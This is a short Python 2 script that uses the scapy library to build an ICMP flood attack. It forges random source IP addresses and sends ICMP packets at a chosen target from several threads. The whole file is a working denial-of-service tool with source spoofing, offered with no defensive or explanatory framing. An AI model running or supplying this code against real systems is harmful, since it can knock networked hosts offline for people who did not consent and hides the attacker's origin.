from scapy.all import *
from threading import Thread
def SpoofIP():
	return "%s.%s.%s.%s" %(random.randint(1,255),random.randint(1, 255),random.randint(1, 255),random.randint(1, 255))


class ICMPFlood():
    def __init__(self,dst,count):
        self.dst    = dst
        self.count  = count
        print dst

    def ThreadStart(self):
        for i in range(10):
            t = Thread(target=self.Start)
            t.start()
            t.join()

    def Start(self):
        for i in range(int(self.count) / 10):
            self.Attack()

    def Attack(self):
        src_ip = SpoofIP()
        Network_Packet = IP(src=src_ip, dst=self.dst) / ICMP()
        send(Network_Packet, verbose=False)
